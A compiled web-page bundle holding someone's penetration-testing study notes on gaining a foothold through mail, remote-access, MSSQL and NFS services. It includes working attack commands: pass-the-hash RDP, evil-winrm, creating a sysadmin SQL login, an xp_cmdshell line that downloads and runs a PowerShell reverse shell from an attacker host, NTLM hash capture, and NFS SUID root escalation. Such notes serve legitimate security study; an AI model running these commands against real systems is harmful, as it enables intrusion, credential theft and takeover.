"use strict";(self.webpackChunkthe_nest_new=self.webpackChunkthe_nest_new||[]).push([[749],{3905:function(e,n,t){t.d(n,{Zo:function(){return p},kt:function(){return u}});var s=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function r(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);n&&(s=s.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,s)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?r(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):r(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,s,a=function(e,n){if(null==e)return{};var t,s,a={},r=Object.keys(e);for(s=0;s<r.length;s++)t=r[s],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(s=0;s<r.length;s++)t=r[s],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=s.createContext({}),c=function(e){var n=s.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},p=function(e){var n=c(e.components);return s.createElement(l.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return s.createElement(s.Fragment,{},n)}},m=s.forwardRef((function(e,n){var t=e.components,a=e.mdxType,r=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),m=c(t),u=a,h=m["".concat(l,".").concat(u)]||m[u]||d[u]||r;return t?s.createElement(h,o(o({ref:n},p),{},{components:t})):s.createElement(h,o({ref:n},p))}));function u(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var r=t.length,o=new Array(r);o[0]=m;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i.mdxType="string"==typeof e?e:a,o[1]=i;for(var c=2;c<r;c++)o[c]=t[c];return s.createElement.apply(null,o)}return s.createElement.apply(null,t)}m.displayName="MDXCreateElement"},900:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return i},contentTitle:function(){return l},metadata:function(){return c},toc:function(){return p},default:function(){return m}});var s=t(7462),a=t(3366),r=(t(7294),t(3905)),o=["components"],i={sidebar_position:3},l="Using common services",c={unversionedId:"cybersecurity/pentest-notes/foothold/services",id:"cybersecurity/pentest-notes/foothold/services",title:"Using common services",description:"Email",source:"@site/docs/cybersecurity/pentest-notes/foothold/services.md",sourceDirName:"cybersecurity/pentest-notes/foothold",slug:"/cybersecurity/pentest-notes/foothold/services",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/services",editUrl:"https://github.com/crystalwwj/the-nest/edit/main/docs/cybersecurity/pentest-notes/foothold/services.md",tags:[],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3},sidebar:"tutorialSidebar",previous:{title:"Web",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/web"},next:{title:"SMB, LDAP, Kerberos",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/smb"}},p=[{value:"Email",id:"email",children:[{value:"SMTP",id:"smtp",children:[],level:3},{value:"POP",id:"pop",children:[],level:3},{value:"IMAP",id:"imap",children:[],level:3}],level:2},{value:"Remote Access",id:"remote-access",children:[{value:"RDP",id:"rdp",children:[],level:3},{value:"WSMAN",id:"wsman",children:[],level:3}],level:2},{value:"Databases",id:"databases",children:[{value:"MSSQL",id:"mssql",children:[],level:3}],level:2},{value:"Others",id:"others",children:[{value:"NFS",id:"nfs",children:[{value:"PrivEsc",id:"privesc",children:[],level:4}],level:3}],level:2}],d={toc:p};function m(e){var n=e.components,t=(0,a.Z)(e,o);return(0,r.kt)("wrapper",(0,s.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"using-common-services"},"Using common services"),(0,r.kt)("h2",{id:"email"},"Email"),(0,r.kt)("h3",{id:"smtp"},"SMTP"),(0,r.kt)("p",null,"SMTP usually runs on port 25, 265(ssl), and 587(ssl), but of course it could run on any other port. If you find a port running SMTP, you can connect and login to it using:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# connecting\ntelnet <IP> 25\n\n# authenticate with username password (will be prompted)\nAUTH\n\n# Tell the server your domain name\nEHLO <domain>   # ex: EHLO the-nest.com\n\n# to send a letter, ex: from crystal to steven\nMAIL FROM crystal@the-nest.com\nRCPT TO steven@the-nest.com\nDATA\n....type your stuff here....\nEOF     # to indicate that your message is completed\n")),(0,r.kt)("p",null,"You don't always need authentication to use the SMTP service, so it's likely that you can send emails or issue other commands without valid credentials."),(0,r.kt)("p",null,"You can enumerate usernames with some commands:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# VRFY\nVRFY root\n250 Super-User <root@myhost>\nVRFY blah\n550 blah... User unknown\n\n# EXPN\nEXPN test\n550 5.1.1 test... User unknown\nEXPN root\n250 2.1.5 <ed.williams@myhost>\nEXPN sshd\n250 2.1.5 sshd privsep <sshd@mail2>\n\n# RCPT TO\nMAIL FROM:test@test.org\n250 2.1.0 test@test.org... Sender ok\nRCPT TO:test\n550 5.1.1 test... User unknown\nRCPT TO:admin\n550 5.1.1 admin... User unknown\nRCPT TO:ed\n250 2.1.5 ed... Recipient ok\n")),(0,r.kt)("h3",{id:"pop"},"POP"),(0,r.kt)("p",null,"POP usually runs on port 110 and 995(ssl). It allows you to fetch and retrieve emails. The messages arestored on the client machine and deleted from the server. "),(0,r.kt)("p",null,"The basic commands are:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# connecting\ntelnet <IP> 110\n\n# login\nuser <username>\npass <password>\n\n# get capabilities\ncapa\n\n# list emails\nlist\n\n# read emails of index\nretr 1  # first email\nretr 2\n\n# delete emails of index\ndele 1\n\n# exit and close connection\nquit\n")),(0,r.kt)("h3",{id:"imap"},"IMAP"),(0,r.kt)("p",null,"IMAP uses port 143 and 993(ssl). Similar to POP, this service allows you to retrieve received email. Contrary to POP though, you aren't downloading or storing messages to your system. You're actually reading the information from the server itself, so this protocol allows you to access your mails from multiple devices simultaneously."),(0,r.kt)("p",null,"The basic commands are:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'# connecting\ntelnet <IP> 143\n\n# login, use quotes around strings if it contains spaces of othe special chars\nA1 LOGIN <username> <password>\n\n# list folder and mailboxes\nA1 LIST "" *\nA1 LIST INBOX *\nA1 LIST "Archive" *\n\n# create/delete folders/mailboxes\nA1 CREATE INBOX.Archive.2012\nA1 DELETE "To Read"\n\n# select mailbox\nA1 SELECT INBOX\n\n# list messages, FLAGS can be defined for mailboxes and will be given from SELECT command\n# system-defined flags are: Seen, Answered, Flagged, Deleted, Draft, Recent\nA1 FETCH 1:* (FLAGS)\nA1 UID FETCH 1:* (FLAGS)\n\n# Retrieve Message Content\nA1 FETCH 2 body[text]\nA1 FETCH 2 all\nA1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])\n\n# close mailbox\nA1 CLOSE\n\n# logout and close connection\nA1 LOGOUT\n')),(0,r.kt)("h2",{id:"remote-access"},"Remote Access"),(0,r.kt)("h3",{id:"rdp"},"RDP"),(0,r.kt)("p",null,"RDP by default runs on port 3389 and is a windows service."),(0,r.kt)("p",null,"To connect, I use ",(0,r.kt)("inlineCode",{parentName:"p"},"xfreerdp")," since it's installed in kali by default and is pretty fast."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# use -sec-nla if necessary\nxfreerdp /u:user /p:password321 /cert-ignore /v:10.10.178.149\n\n# with domain and hash\nxfreerdp /u:[domain\\]<username> /pth:<hash> /v:<IP>\n")),(0,r.kt)("h3",{id:"wsman"},"WSMAN"),(0,r.kt)("p",null,"WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. It's usually in a higher port(5985, 5986), so if you don't run ",(0,r.kt)("inlineCode",{parentName:"p"},"-p-")," nmap by default will not find it since it's not in the top 1000 common ports. But if you have creds this gives an awesome shell!"),(0,r.kt)("p",null,"For WinRM hacking, use ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Hackplayers/evil-winrm"},"evil-winrm"),"."),(0,r.kt)("p",null,"Usage:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# powersploit in /usr/share/windows-resources/powersploit/Exfiltration\n\n# if you want to load powershell scripts, supply the -s option\nevil-winrm -i 10.10.10.149 -u SUPPORTDESK\\\\chase -s ~/pshs/ -p 'Q4)sJu\\Y8qz*A3?d'\n\n# if you want to load executables, supply the -e option\nevil-winrm -i 10.10.10.149 -u SUPPORTDESK\\\\chase -e ~/execs/ -p 'Q4)sJu\\Y8qz*A3?d'\n\n# you can upload/download any files inside shell\nupload <filename>\ndownload <filename>\n")),(0,r.kt)("h2",{id:"databases"},"Databases"),(0,r.kt)("h3",{id:"mssql"},"MSSQL"),(0,r.kt)("p",null,"Microsoft SQL Server is a common database server running on port 1433. For a mapping of versions to Windows version, see CREST notes."),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Information taken from ",(0,r.kt)("a",{parentName:"strong",href:"https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server"},"Hacktricks - Pentesting MSSQL"))),(0,r.kt)("p",null,"The default MSSQL system tables are:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"master Database : system-level information for this SQL Server"),(0,r.kt)("li",{parentName:"ul"},"msdb Database : for scheduling alerts and jobs"),(0,r.kt)("li",{parentName:"ul"},"model Database : the template for all databases created on this SQL Server. The modifications apply to any databases created afterwards."),(0,r.kt)("li",{parentName:"ul"},"Resource Database : read-only database with default system objects. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database."),(0,r.kt)("li",{parentName:"ul"},"tempdb Database : work-space for holding temporary objects or intermediate result sets.")),(0,r.kt)("p",null,"The high-privilege database user is ",(0,r.kt)("inlineCode",{parentName:"p"},"sa")," which has admin rights. Since the user running MSSQL will probably have SeImpersonatePrivilege, try JuicyPotato once you have cracked his password with John for privesc."),(0,r.kt)("p",null,"You can connect to MSSQL with ",(0,r.kt)("inlineCode",{parentName:"p"},"mssqlclient.py")," from the ",(0,r.kt)("inlineCode",{parentName:"p"},"impacket")," package, ",(0,r.kt)("inlineCode",{parentName:"p"},"sqsh"),", or ",(0,r.kt)("inlineCode",{parentName:"p"},"crackmapexec"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# mssqlclient\nmssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth\n\n# sqsh\nsqsh -S 10.11.1.31 -U sa -P poiuytrewq -D bankdb\n\n#Username + Password + CMD command\ncrackmapexec mssql -d <Domain name> -u <username> -p <password> -x \"whoami\"\n\n#Username + Hash + PS command\ncrackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'\n")),(0,r.kt)("p",null,"Some basic commands include:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"-- see version\nSELECT @@ version;\n\n-- see permissions\nSELECT * FROM fn_my_permissions(NULL, 'SERVER');\n\n-- query data\nuse <db-name>;\nSELECT name FROM sysobjects WHERE xtype = 'U';\n\n-- Here's a workflow from hacktricks\n-- Get databases\nSELECT name FROM master.dbo.sysdatabases \n\n-- Get table names\nSELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;\n\n-- List Linked Servers\nEXEC sp_linkedservers\nSELECT * FROM sys.servers;\n\n-- List users\nselect sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;\n\n-- Create user with sysadmin privs\nCREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'\nsp_addsrvrolemember 'hacker', 'sysadmin'\n")),(0,r.kt)("p",null,"You can run commands by enabling ",(0,r.kt)("inlineCode",{parentName:"p"},"xp_cmdshell"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-SQL"},"EXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n\n-- run command\nEXEC master..xp_cmdshell 'whoami'\n\n-- run reverse shell, remember to host file\nEXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://<IP>:<port>/Invoke-PowerShellTcp.ps1\") | powershell -noprofile'\n")),(0,r.kt)("p",null,"You can also try to trick the database into performing NTLM authentication to our server and catch the hash with responder of your SMB server."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-SQL"},"-- directly\nxp_dirtree //10.10.14.3/kali\n\n-- or\nexec master.dbo.xp_dirtree '\\\\<attacker_IP>\\any\\thing'\n")),(0,r.kt)("h2",{id:"others"},"Others"),(0,r.kt)("h3",{id:"nfs"},"NFS"),(0,r.kt)("p",null,"The following notes taken from ",(0,r.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe"},"HackTricks"),"!"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"NFS")," stands for Network File System and usually runs on port 2049. It is a client/server system that allows users to mount shares to a local directory across a network and access files. If you run nmap with nse scripts, it will often give you the NFS exports and permissions."),(0,r.kt)("p",null,"The config files for NFS are ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/exports")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/lib/nfs/etab")),(0,r.kt)("p",null,"To mount:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# check which folders are available\nshowmount -e <IP>\n\n# mount! (for linux)\nmount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock\n\n# for example, when NFS is running on non-default port\nsudo mount -t nfs 127.0.0.1:/srv/Share /tmp/pe -o port=7777\n\n# allow read write and specify version, ver 2 doesn't have any auth!\nmount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs\n\n# mount to Windows dir\nmount -t cifs //10.10.10.134/backups /mnt -o user=,password=\n")),(0,r.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,r.kt)("div",{parentName:"div",className:"admonition-heading"},(0,r.kt)("h5",{parentName:"div"},(0,r.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,r.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,r.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"My tip")),(0,r.kt)("div",{parentName:"div",className:"admonition-content"},(0,r.kt)("p",{parentName:"div"},"If the folder contains files or folders only accessible by some user or UID, just create a local user with that UID then you can access the files!"))),(0,r.kt)("h4",{id:"privesc"},"PrivEsc"),(0,r.kt)("p",null,"If any directories on the server is configured as ",(0,r.kt)("strong",{parentName:"p"},"no_root_squash"),", it means you can access the folder and write files as root if you were local root on your client machine."),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("p",{parentName:"li"},(0,r.kt)("strong",{parentName:"p"},"no_root_squash"),": root user on client can access files on NFS server as root. (Otherwise you should be 'nobody') ")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("p",{parentName:"li"},(0,r.kt)("strong",{parentName:"p"},"no_all_squash"),": similar to no_root_squash but applies to non-root users. You can create suid files as a target user, execute as nobody and elevate to different user."))),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Remote exploit")),(0,r.kt)("p",null,"Copy SUID binary to mounted folder as root, then execute from victim to get shell."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# Attacker, as root user\nmkdir /tmp/pe\nmount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe\ncd /tmp/pe\ncp /bin/bash .\nchmod +s bash\n\n# OR, use SUID payloads \ngcc payload.c -o payload\ncp payload .\n\n# Victim\ncd <SHAREDD_FOLDER>\n./bash -p # ROOT shell\n")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Local exploit")),(0,r.kt)("p",null,"Sometimes the ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/exports")," may explicitly whitelist IP addresses, so you have to exploit locally as a low-privileged user."),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"NFSv3 specification mandates that it\u2019s up to the client to advertise its uid/gid when accessing the share. Thus it\u2019s possible to fake the uid/gid by forging the NFS RPC calls if the share is already mounted!")),(0,r.kt)("p",null,"The exploit library can be found ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/sahlberg/libnfs"},"here")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("p",{parentName:"li"},"Compile the exploit (might have to tweak depending on kernel)"),(0,r.kt)("pre",{parentName:"li"},(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"./bootstrap\n./configure\nmake\ngcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/\n"))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("p",{parentName:"li"},"Write and compile your own exploit"),(0,r.kt)("pre",{parentName:"li"},(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'cat pwn.c\n# int main(void){setreuid(0,0); system("/bin/bash"); return 0;}\ngcc pwn.c -o a.out\n'))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("p",{parentName:"li"},"Place exploit on share and make it suid root by faking RPC calls with the exploit library"),(0,r.kt)("pre",{parentName:"li"},(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/\nLD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out\nLD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out\nLD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out\n"))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("p",{parentName:"li"},"Launch attack by executing file on victim"))))}m.isMDXComponent=!0}}]);